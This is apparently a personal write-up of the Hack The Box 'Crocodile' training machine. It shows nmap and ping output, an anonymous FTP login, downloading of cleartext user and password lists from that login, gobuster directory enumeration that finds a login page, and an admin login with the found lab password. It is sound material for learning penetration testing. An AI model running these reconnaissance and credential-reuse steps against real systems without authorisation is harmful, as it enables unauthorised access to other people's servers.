---
title: "Crocodile"
description: ""
summary: ""
date: 2025-02-23T22:50:58+01:00
lastmod: 2025-02-23T22:50:58+01:00
draft: false
weight: 999
toc: true
seo:
  title: "" # custom title (optional)
  description: "" # custom description (recommended)
  canonical: "" # custom canonical URL (optional)
  noindex: false # false (default) or true
---

**[[22-06-2026]]**

## Further reading

Crocodile is a very easy Linux machine which showcases the dangers of misconfigured authentication and sensitive data exposure. A vulnerable FTP server instance is misconfigured to allow anonymous authentication and upon enumerating the server, sensitive files can be found containing cleartext credentials. **Enumerating** and **fuzzing** the website will reveal a **hidden login endpoint** where the previously acquired credentials can be used to gain access to the admin panel.

**PING**
```
┌─odaj@parrot
└──╼ $ping -c4 10.129.1.15
PING 10.129.1.15 (10.129.1.15) 56(84) bytes of data.
64 bytes from 10.129.1.15: icmp_seq=1 ttl=63 time=132 ms
64 bytes from 10.129.1.15: icmp_seq=2 ttl=63 time=157 ms
64 bytes from 10.129.1.
15: icmp_seq=3 ttl=63 time=181 ms
64 bytes from 10.129.1.15: icmp_seq=4 ttl=63 time=265 ms
```

**NMAP SCAN on the target**

```
┌─[odaj@parrot]─[~/Downloads]
└──╼ $nmap -sC -sV 10.129.1.15
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-22 15:03 IDT
Nmap scan report for 10.129.1.15
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.15.118
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Smash - Bootstrap Business Template
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.68 seconds
```
Once services have been detected using, we proceed with testing each service to see what information can be gathered further

**FTP Service**
```
┌─[✗]─[odaj@parrot]─[~/Downloads]
└──╼ $ftp -?
usage: ftp [-46AadefginpRtVv] [-N NETRC] [-o OUTPUT] [-P PORT] [-q QUITTIME]
[-r RETRY] [-s SRCADDR] [-T DIR,MAX[,INC]] [-x XFERSIZE]
[[USER@]HOST [PORT]]
[[USER@]HOST:[PATH][/]]
[file:///PATH]
[ftp://[USER[:PASSWORD]@]HOST[:PORT]/PATH[/][;type=TYPE]]
[http://[USER[:PASSWORD]@]HOST[:PORT]/PATH]
[https://[USER[:PASSWORD]@]HOST[:PORT]/PATH]
...
ftp -u URL FILE ...
ftp -?
-4            Only use IPv4 addresses
-6            Only use IPv6 addresses
-A            Force active mode
-a            Use anonymous login
-d            Enable debugging
-e            Disable command-line editing
-f            Force cache reload for FTP or HTTP proxy transfers
-g            Disable file name globbing
-i            Disable interactive prompt during multiple file transfers
-N NETRC      Use NETRC instead of ~/.netrc
-n            Disable auto-login
-o OUTPUT     Save auto-fetched files to OUTPUT
-P PORT       Use port PORT
-p            Force passive mode
-q QUITTIME   Quit if connection stalls for QUITTIME seconds
-R            Restart non-proxy auto-fetch
-r RETRY      Retry failed connection attempts after RETRY seconds
-s SRCADDR    Use source address SRCADDR
-t            Enable packet tracing
-T DIR,MAX[,INC]
Set maximum transfer rate for direction DIR to MAX bytes/s,
with optional increment INC bytes/s
-u URL        URL to upload file arguments to
-V            Disable verbose and progress
-v            Enable verbose and progress
-x XFERSIZE   Set socket send and receive size to XFERSIZE
-?            Display this help and exit
 ```

Now we login as anynomous
```
┌─[odaj@parrot]─[~/Downloads]
└──╼ $ftp -a 10.129.1.15
Connected to 10.129.1.15.
220 (vsFTPd 3.0.3)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

Nice, we are here, and we see two attracting files
```
ftp> ls
229 Entering Extended Passive Mode (|||43508|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
226 Directory send OK.
```

Tranfering the files.
```
ftp> get allowed.userlist
Not connected.
ftp> get allowed.userlist.passwd
Not connected.
ftp> open 10.129.1.15
Connected to 10.129.1.15.
220 (vsFTPd 3.0.3)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> get allowed.userlist.passwd
local: allowed.userlist.passwd remote: allowed.userlist.passwd
229 Entering Extended Passive Mode (|||47924|)
150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
100% |***********************************************************************************************************************************************************************************************|    62      441.94 KiB/s    00:00 ETA
226 Transfer complete.
62 bytes received in 00:00 (0.29 KiB/s)
ftp> get allowed.userlist
local: allowed.userlist remote: allowed.userlist
229 Entering Extended Passive Mode (|||44141|)
150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
100% |***********************************************************************************************************************************************************************************************|    33      236.95 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.15 KiB/s)
ftp>


ftp> exit
221 Goodbye.
```

Now we check through the files, using the credentials to attack the FTP site further. And what we have got looks too direct but it's good.

```
┌─[odaj@parrot]─[~/Downloads]
└──╼ $cat allowed.userlist
aron
pwnmeow
egotisticalsw
admin
┌─[odaj@parrot]─[~/Downloads]
└──╼ $cat allowed.userlist.passwd
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
 ```
trying the login on FTP. And yes, the FTP server just takes in anonymous.
┌─[odaj@parrot]─[~/Downloads]
└──╼ $ftp 10.129.1.15
Connected to 10.129.1.15.
220 (vsFTPd 3.0.3)
Name (10.129.1.15:odaj): aron
530 This FTP server is anonymous only.
ftp: Login failed
ftp>
```
This is also good as it helps us shift our focus away from the FTP to port 80.

Accessing the IP on the browser on port 80: ```10.129.1.15:80```, gave us a webpage with little buttons and navigations - nothing useful. Looking at what we have from the nmap scan, this is an Apache server running on port 80 - We need a login page to try our credentials. Let's see if we can get some directories that will give us a login page, somewhere. Here comes gobuster:


```
┌─[odaj@parrot]─[~/Downloads]
└──╼ $gobuster dir -u http://10.129.1.15 -w /usr/share/wordlists/dirb/common.txt -x .php,.html -s 200
Error: error on parsing arguments: status-codes ("200") and status-codes-blacklist ("404") are both set - please set only one. status-codes-blacklist is set by default so you might want to disable it by supplying an empty string.
┌─[✗]─[odaj@parrot]─[~/Downloads]
└──╼ $gobuster dir -u http://10.129.1.15 -w /usr/share/wordlists/dirb/common.txt -x php,html -s 200 -b ""
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:            http://10.129.1.15
[+] Method:         GET
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200
[+] User Agent:     gobuster/3.6
[+] Extensions:     php,html
[+] Timeout:        10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/config.php           (Status: 200) [Size: 0]
/index.html           (Status: 200) [Size: 58565]
/index.html           (Status: 200) [Size: 58565]
/login.php            (Status: 200) [Size: 1577]
Progress: 13842 / 13845 (99.98%)
===============================================================
Finished
===============================================================
```

Here we have 2 php pages: config (I am ignoring it first, the "Size" is not giving) and then the login. Trying this out gives us a login page.

And we got our flag using admin & rKXM59ESxesUFHAd =^-^=
